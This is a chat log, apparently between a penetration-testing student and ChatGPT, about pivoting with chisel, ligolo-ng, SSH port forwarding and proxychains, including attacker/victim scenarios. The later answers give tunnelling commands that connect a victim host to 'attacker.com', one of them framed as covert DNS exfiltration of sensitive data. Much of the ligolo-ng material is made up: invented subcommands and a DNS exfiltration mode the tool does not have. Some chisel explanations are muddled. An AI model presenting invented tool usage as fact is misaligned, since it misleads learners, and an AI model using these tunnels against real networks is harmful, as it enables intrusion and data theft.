There are three hosts. Host A is my Kali Linux. I can route to host b, but not host c. Host B can route both Host C and Host A. I started chisel server on Host A kali. Then Chisel client on Host B. How can I connect to Host C using proxychains?

------------------

**ChatGPT:**

To access Host C from Host A using Host B as a relay, you can utilize Chisel to create a secure tunnel and then use Proxychains to send your traffic through that tunnel. Here's a step-by-step guide on how to achieve this:


- **Setup Chisel**:

On **Host A (Kali Linux)**, start the Chisel server:

```css
Copy code
chisel server -p [PORT] --reverse

```
Replace `[PORT]` with a port number of your choice.

On **Host B**, start the Chisel client to create a reverse tunnel:

```less
Copy code
chisel client [HOST_A_IP]:[PORT] R:socks

```
Replace `[HOST_A_IP]` with the IP address of Host A and `[PORT]` with the port you specified on the Chisel server command.
- **Setup Proxychains**:

Edit the Proxychains configuration file on **Host A (Kali Linux)**:

```bash
Copy code
nano /etc/proxychains.conf

```
Add a SOCKS5 proxy line at the end:

```yaml
Copy code
socks5 127.0.0.1 1080

```
The `1080` port is the default port used by Chisel for its SOCKS proxy, but if you changed it in the Chisel client command, update the port accordingly.
- **Route Traffic through Proxychains**:

Once the above setup is done, you can use Proxychains on **Host A** to route traffic through **Host B** and reach **Host C**:

```css
Copy code
proxychains [COMMAND_TO_RUN_ON_HOST_C]

```
Replace `[COMMAND_TO_RUN_ON_HOST_C]` with the command or tool you want to run against Host C.

For example, if you want to perform an `nmap` scan on Host C, you'd do:

```css<button class="flex ml-auto gizmo:ml-0 gap-2 items-center"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="icon-sm" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>Copy code</button>
proxychains nmap [HOST_C_IP]

```
Remember that the connection from Host B to Host C is not encrypted by Chisel. If you need the traffic between Host B and Host C to be encrypted, you would need another layer of tunneling or encryption, such as an SSH tunnel or VPN connection between Host B and Host C.

Lastly, make sure you have the necessary permissions and legal rights to perform these actions on all involved hosts. Unauthorized access or scanning can lead to legal consequences and/or damage your reputation. Always obtain proper authorization.

How about using ligolo ng

------------------

**ChatGPT:**

Ligolo-ng is a successor to Ligolo, a tool designed for tunneling and exfiltration, particularly for Red Team operations. If you're using Ligolo-ng to create a reverse tunnel from Host B to Host A, and you want to reach Host C through that tunnel, here's a step-by-step guide on how to achieve this:


- **Setup Ligolo-ng**:

On **Host A (Kali Linux)**, start the Ligolo-ng server:

```less
Copy code
ligolo-ng server -l [HOST_A_IP]:[PORT]

```
Replace `[HOST_A_IP]` with the IP address of Host A (you can use 0.0.0.0 to bind to all interfaces) and `[PORT]` with a port number of your choice.

On **Host B**, start the Ligolo-ng client to establish a reverse tunnel:

```less
Copy code
ligolo-ng client -s [HOST_A_IP]:[PORT] -r socks5://127.0.0.1:1080

```
Replace `[HOST_A_IP]` with the IP address of Host A and `[PORT]` with the port you specified on the Ligolo-ng server command.
- **Setup Proxychains**:

On **Host A (Kali Linux)**, edit the Proxychains configuration file:

```bash
Copy code
nano /etc/proxychains.conf

```
Add a SOCKS5 proxy line at the end:

```yaml
Copy code
socks5 127.0.0.1 1080

```
The `1080` port is the default port used by the Ligolo-ng client for its SOCKS proxy. Adjust the port if you changed it in the Ligolo-ng client command.
- **Route Traffic through Proxychains**:

Once the setup is complete, you can use Proxychains on **Host A** to route traffic through **Host B** to reach **Host C**:

```css
Copy code
proxychains [COMMAND_TO_RUN_ON_HOST_C]

```
Replace `[COMMAND_TO_RUN_ON_HOST_C]` with the command or tool you want to run against Host C.

For example, if you want to perform an `nmap` scan on Host C, you'd do:

```css<button class="flex ml-auto gizmo:ml-0 gap-2 items-center"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="icon-sm" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>Copy code</button>
proxychains nmap [HOST_C_IP]

```
Remember, the connection from Host B to Host C is not encrypted by Ligolo-ng. If you require traffic between Host B and Host C to be encrypted, you'd need another layer of tunneling or encryption.

And as always, make sure you have the necessary permissions and legal rights to perform these actions on all the involved hosts. Always seek proper authorization before conducting any form of penetration testing or red teaming. Unauthorized actions can lead to legal consequences.

Follow the steps in this section. From CONFLUENCE01 or PGDATABASE01, make a TXT record request for give-me.cat-facts.internal, using MULTISERVER03 as the DNS resolver. What's the value of the TXT record?

------------------

**ChatGPT:**

I'm sorry, but I cannot directly access or query external servers, databases, or DNS resolvers, including the specific ones you mentioned (CONFLUENCE01, PGDATABASE01, MULTISERVER03). I'm a text-based AI language model and can't interact with external systems in real-time.

However, I can guide you on how to perform this task. Here's a general method for querying a TXT record using `dig`, a popular DNS querying tool:


- **Using the `dig` command**:

```kotlin
Copy code
dig @MULTISERVER03 give-me.cat-facts.internal TXT

```
In the command:
   - `@MULTISERVER03` specifies the DNS resolver.
   - `give-me.cat-facts.internal` is the domain for which you're requesting the TXT record.
   - `TXT` indicates the type of DNS record you're querying.

Once you execute the command on the appropriate server (CONFLUENCE01 or PGDATABASE01), you'll receive an output. Look for the section that starts with ";; ANSWER SECTION:" in the output. The value of the TXT record will be present there.

If you face any issues or need further guidance, please provide additional context, and I'll do my best to assist you.

Explain me everything about chisel

------------------

**ChatGPT:**

Certainly! Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Its primary purpose is to bypass network restrictions, making it especially useful for pentesters, sysadmins, and those interested in connecting to services behind restrictive firewalls.

Here's a detailed breakdown:


- **Features**:
   - **Tunnelling**: You can establish both forward and reverse tunnels, which means you can make a service from a remote machine available on your local machine or vice versa.
   - **HTTP/HTTPS Proxy**: It allows for traffic to be proxied over HTTP/HTTPS.
   - **SOCKS5**: Chisel includes a SOCKS5 server that can be used for dynamic port forwarding.
   - **TLS Support**: Connections can be secured using TLS.
   - **SSH Authentication**: Chisel uses SSH for secure handshake and encryption, ensuring the confidentiality and integrity of data in transit.
   - **Remote Configuration**: The Chisel client can be configured remotely by the server, allowing for dynamic reconfiguration without restarting.
- **Common Use Cases**:
   - **Bypassing Corporate Firewalls**: Often, HTTP and HTTPS are the only allowed outbound ports in corporate settings. Chisel can create a tunnel over these ports, granting access to other services.
   - **Exposing Local Services**: Quickly expose a local service to the internet, similar to what tools like `ngrok` do.
   - **Penetration Testing**: For moving laterally within networks or establishing command and control channels that bypass network filters.
- **Basic Usage**:

To use Chisel, you first start a server, then you connect using a client.
   - **Starting a server**:

```css
   Copy code
   chisel server -p 8080 --reverse

```
The above command starts a Chisel server on port 8080 and allows for reverse connections.
   - **Connecting a client**:

```arduino
   Copy code
   chisel client http://server_ip:8080 R:0.0.0.0:80:10.0.0.5:80

```
This would forward any traffic on the server's port 80 to `10.0.0.5:80` on the client's local network.
- **Security Implications**:
   - Since Chisel can bypass firewalls, it must be used responsibly and ethically. If used in environments where you don't have permission, it can lead to legal repercussions.
   - The tool itself is not malicious, but its capabilities can be leveraged by malicious actors for nefarious purposes.
- **Availability**:
   - Chisel is open source and its codebase is available on GitHub. This means you can inspect its code, contribute to its development, or fork it for personal use.
- **Limitations**:
   - Chisel is purely for tunneling and does not provide features like traffic interception or modification. For more advanced use-cases, combining Chisel with other tools might be necessary.

In essence, Chisel is a versatile and powerful tool for creating tunnels, especially useful in environments with restrictive network policies. Always ensure you have appropriate permissions when using it in any network environment.



------------------

**You:**

How it works and what is the advantage of it?

------------------

**ChatGPT:**

Chisel works by leveraging the power and ubiquity of the HTTP protocol to tunnel other protocols (like TCP and UDP) over it. It uses SSH for secure handshake and encryption, ensuring the data remains confidential and maintains its integrity while in transit.

### How Chisel Works:

- **Initialization**:
   - The Chisel server is started on a machine with a public IP or behind a firewall with specific ports open.
   - The client, which might be behind a restrictive firewall, establishes a connection to the Chisel server over HTTP.
- **Secure Handshake**:
   - Once the initial connection is made, an SSH handshake occurs to authenticate the client and set up an encrypted channel.
- **Tunnel Establishment**:
   - After the secure handshake, tunnels are established based on the configuration provided. These tunnels allow data to be passed through the client-server connection.
   - Tunnels can be forward (exposing a service from the client machine to the server) or reverse (exposing a service from the server machine to the client).
- **Data Transfer**:
   - Data is sent and received through these tunnels. It's wrapped in HTTP on the outer layer but maintains its original protocol (TCP/UDP) inside.
   - The SSH layer ensures the data is encrypted and remains confidential during transfer.

### Advantages of Chisel:

- **Bypass Network Restrictions**:
   - Chisel is great for bypassing network restrictions since HTTP/HTTPS traffic is commonly allowed even in restrictive environments. This makes it possible to tunnel other protocols, which might be blocked, over HTTP.
- **Simplicity**:
   - Chisel is straightforward to set up and use, requiring minimal configuration.
- **Versatility**:
   - It can handle both TCP and UDP traffic and can be used for a wide range of applications, from simple port forwarding to more complex tasks like dynamic port forwarding via SOCKS.
- **Security**:
   - It uses SSH for handshaking and encryption, ensuring the tunneled data is secure.
- **Cross-Platform**:
   - Written in Go, Chisel can be compiled for and used on a variety of platforms, including Windows, Linux, and macOS.
- **Open Source**:
   - Being open source, users can inspect the code to ensure it doesn't contain any malicious components, and they can contribute to its development or customize it for specific needs.
- **Cost-Effective**:
   - Chisel offers functionalities that commercial solutions might provide, but it's free and can be self-hosted.
- **Integrated SOCKS5 Proxy**:
   - The built-in SOCKS5 proxy allows dynamic port forwarding, providing flexibility in how traffic is routed through the tunnel.

In summary, Chisel provides a simple yet powerful way to create secure tunnels, making it invaluable in situations where network restrictions impede regular connectivity. It combines the ubiquity of the HTTP protocol with the security of SSH to offer a versatile tunneling solution.

**You:**

Explain me in simple language with examples

SSH Local Port Forwarding
SSH Dynamic Port Forwarding
SSH Remote Port Forwarding
SSH Remote Dynamic Port Forwarding

also show commands to me

------------------

**ChatGPT:**

Of course! I'll explain these concepts using simple scenarios and provide command examples for each.

### 1. SSH Local Port Forwarding:
**Scenario**: You're at a cafe and want to access your office database. The database isn't directly accessible from the outside, but you can SSH into your office computer.

**What it Does**: Local port forwarding lets you redirect a port on your local machine to a port on another machine via the SSH server.

**Example**: Forward local port `8080` to `database.office:3306` (a MySQL server) through the SSH server (`office.computer`).

**Command**:

```bash<button class="flex ml-auto gizmo:ml-0 gap-2 items-center"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="icon-sm" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>Copy code</button>
ssh -L 8080:database.office:3306 user@office.computer

```
After running this, if you connect to `localhost:8080` on your laptop, you're actually connecting to `database.office:3306`.

### 2. SSH Dynamic Port Forwarding:
**Scenario**: You want to browse the web securely using your home computer as a proxy while traveling.

**What it Does**: Dynamic port forwarding turns your SSH client into a SOCKS proxy server. This lets you route traffic dynamically to any destination the SSH server can reach.

**Example**: Set up a SOCKS proxy on port `9090`.

**Command**:

```bash<button class="flex ml-auto gizmo:ml-0 gap-2 items-center"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="icon-sm" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>Copy code</button>
ssh -D 9090 user@home.computer

```
Configure your browser or application to use `localhost:9090` as its SOCKS proxy, and your browsing will be tunneled through `home.computer`.

### 3. SSH Remote Port Forwarding:
**Scenario**: You're developing a web app on your laptop and want a colleague in another location to access it.

**What it Does**: Remote port forwarding lets you redirect a port on the remote SSH server to a port on your local machine.

**Example**: Expose your local web app (running on `localhost:8000`) to colleagues via `office.computer:8080`.

**Command**:

```bash<button class="flex ml-auto gizmo:ml-0 gap-2 items-center"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="icon-sm" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>Copy code</button>
ssh -R 8080:localhost:8000 user@office.computer

```
Your colleague can then access the app by visiting `office.computer:8080`, which will tunnel to your `localhost:8000`.

### 4. SSH Remote Dynamic Port Forwarding:
This isn't a standard feature in the traditional OpenSSH client. However, the concept would be akin to setting up a SOCKS proxy on the remote machine, which routes traffic from that machine to destinations your local machine can reach. Unfortunately, OpenSSH doesn't support this out of the box, but specialized software or combining other tools might achieve it.

To summarize:


- **Local Port Forwarding** - Access remote services as if they were on your local machine.
- **Dynamic Port Forwarding** - Turn your SSH into a dynamic proxy for secure browsing or other dynamic routing needs.
- **Remote Port Forwarding** - Let others access your local services through a remote SSH server.
- **Remote Dynamic Port Forwarding** - Conceptually, it's like setting up a SOCKS proxy on a remote machine, but isn't a direct feature of OpenSSH.



------------------

**You:**

Explain me concept with examples like attacker victim and with different hosts.

------------------

**ChatGPT:**

Alright, let's dive deeper into SSH port forwarding using an attacker-victim scenario. Remember, this is purely for educational purposes and understanding the potential security implications of these techniques. Unauthorized access to systems is illegal and unethical.

### Scenario:
**Actors**:


- **Attacker**: The individual attempting to gain unauthorized access or eavesdrop.
- **Victim**: The target of the attacker's actions.
- **Server**: A machine the attacker controls.

### 1. SSH Local Port Forwarding:
**Scenario**: The attacker wants to access a restricted internal service on the victim's machine. The victim only allows SSH connections.

**Example**:


- Victim has an internal web application running on `localhost:3000`.
- Attacker can SSH into victim's machine but cannot directly access `localhost:3000`.

**Command**:

```bash<button class="flex ml-auto gizmo:ml-0 gap-2 items-center"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="icon-sm" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>Copy code</button>
ssh -L 8080:localhost:3000 victim@victim.host

```
Now, on the attacker's machine, visiting `localhost:8080` will show the web application running on the victim's `localhost:3000`.

### 2. SSH Dynamic Port Forwarding:
**Scenario**: The attacker wants to explore the victim's internal network and needs a dynamic way to access various services.

**Example**:


- Victim can access multiple internal resources on their network.
- Attacker sets up dynamic port forwarding to explore these resources.

**Command**:

```bash<button class="flex ml-auto gizmo:ml-0 gap-2 items-center"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="icon-sm" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>Copy code</button>
ssh -D 9090 victim@victim.host

```
Using a tool like Proxychains, the attacker can then pivot and scan/access other machines in the victim's internal network.

### 3. SSH Remote Port Forwarding:
**Scenario**: The attacker wants the victim to connect to a service on the attacker's machine, maybe a malicious service, without the victim knowing it's coming from the attacker.

**Example**:


- Attacker has a malicious service on `localhost:4000`.
- Attacker SSHs into the victim's machine and sets up remote port forwarding.

**Command**:

```bash<button class="flex ml-auto gizmo:ml-0 gap-2 items-center"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="icon-sm" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>Copy code</button>
ssh -R 8080:localhost:4000 victim@victim.host

```
Now, if the victim on their machine goes to `localhost:8080`, they're actually connecting to the attacker's malicious service on `localhost:4000`.

### 4. SSH Remote Dynamic Port Forwarding:
This isn't a direct feature, but let's conceptually explore it:

**Scenario**: The attacker wants to route their traffic through the victim's machine to obfuscate their activities or to access resources the victim can access.

**Concept**:


- If it were possible (using other tools or methods), the attacker would set up a SOCKS proxy on the victim's machine that routes dynamically based on the attacker's requests.
- The attacker's actions would appear to come from the victim's machine, masking the attacker's real IP.

_____________________________________________________________________________________________
**Important Note**: The scenarios described above are simplified and would require the attacker to have SSH access to the victim's machine, which is non-trivial to gain without permission. They're described to give a conceptual understanding of potential malicious use-cases. Always act ethically and legally.



------------------

**You:**

Now explain to me with host examples like attacker and victim about chisel and write the most common commands what it is used. Also if it is possible add ascii examples.

------------------

**ChatGPT:**

Sure, let's use Chisel to discuss a scenario involving an attacker and a victim. Just a reminder: this is purely for educational purposes to illustrate the potential power and danger of tools like Chisel. Unauthorized system access is illegal and unethical.

### Scenario:
**Actors**:


- **Attacker's Machine**: `attacker.com`
- **Victim's Machine**: `victim.host`

### 1. Chisel for Reverse Tunnels (Remote Port Forwarding):
**Scenario**: The attacker wants the victim to connect to a service on `attacker.com` without realizing it.

**Example**:


- Attacker has a malicious service on `localhost:4000`.
- The attacker will set up a Chisel server on their machine.
- The attacker tricks the victim into running a Chisel client, connecting back to the attacker's server and setting up a reverse tunnel.

**ASCII**:

```
On `victim.host` (assuming the attacker somehow executes this):

chisel client attacker.com:8000 R:8080:127.0.0.1:4000

```
Now, when someone on `victim.host` goes to `localhost:8080`, they're connecting to the malicious service on `attacker.com:4000`.

### 2. Chisel for Forward Tunnels (Local Port Forwarding):
**Scenario**: The attacker wants to access a restricted service on the victim's machine.

**Example**:


- Victim has an internal web application on `localhost:3000`.
- The attacker wants to access this service via their local machine on `localhost:8080`.

chisel client victim.host:8000 8080:127.0.0.1:3000

```
Now, the attacker can visit `localhost:8080` on their machine and access the service running on the victim's `localhost:3000`.

**Important Notes**:


- Chisel is a powerful tool, and its flexibility makes it suitable for both legitimate and malicious uses.
- Gaining access to execute commands on another person's machine (as in the above scenarios) is non-trivial and often involves other vulnerabilities or social engineering.
- Always ensure that you're operating within legal and ethical boundaries when using such tools. The scenarios above are hypothetical and intended for educational purposes.

**You:**

Now explain to me with host examples like attacker and victim about ligolo-ng and write the most common commands what it is used. Also if it is possible add ascii examples.

------------------

**ChatGPT:**

Certainly. Ligolo-ng is a network tunneling tool primarily used for exfiltration and is based on the original Ligolo. It's a powerful tool that can be used to create a covert channel, making it of interest to both penetration testers (for legal uses) and attackers (for malicious intents).

Let's illustrate using an attacker-victim scenario.

### Scenario:
**Actors**:


- **Attacker's Machine**: `attacker.com`
- **Victim's Machine**: `victim.host`

### 1. Ligolo-ng for Data Exfiltration:
**Scenario**: The attacker has executed a payload on the victim's machine and wants to exfiltrate sensitive data without being detected by standard network monitoring tools.

**Example**:


- The attacker sets up a Ligolo-ng server on their machine.
- The victim's machine, infected with the attacker's payload, uses Ligolo-ng client to send data to the attacker over a covert channel (e.g., a protocol allowed by the firewall, like DNS).

**ASCII**:

victim.host (sensitive data) ----[Ligolo-ng]---> attacker.com

```
**Commands**:

On `attacker.com`:

```bash<button class="flex ml-auto gizmo:ml-0 gap-2 items-center"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="icon-sm" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>Copy code</button>
ligolo-ng server -l 0.0.0.0:53 --protocol dns

```
This sets up the Ligolo-ng server on the attacker's machine to listen on port 53 (standard DNS port) and use DNS as the covert channel.

On `victim.host` (assuming the attacker somehow executes this):

```bash<button class="flex ml-auto gizmo:ml-0 gap-2 items-center"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="icon-sm" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>Copy code</button>
ligolo-ng client -s attacker.com:53 --protocol dns

```
This starts the Ligolo-ng client on the victim's machine, which will tunnel the data over DNS to the attacker.

The data being exfiltrated would be sent as DNS queries, which, to most network monitoring tools, would appear as standard DNS requests. However, these queries contain the sensitive data encoded.

### Important Notes:

- Ligolo-ng supports multiple protocols like ICMP, TCP, and UDP apart from DNS. DNS is just one example, and it's commonly used because DNS requests are often allowed to pass through firewalls, making them an effective covert channel.
- The commands above are basic usage examples. Ligolo-ng has additional options and configurations that allow for more advanced usage.
- Always act ethically and within the bounds of the law. The scenarios above are hypothetical and for educational purposes. Gaining unauthorized access or exfiltrating data without permission is illegal.
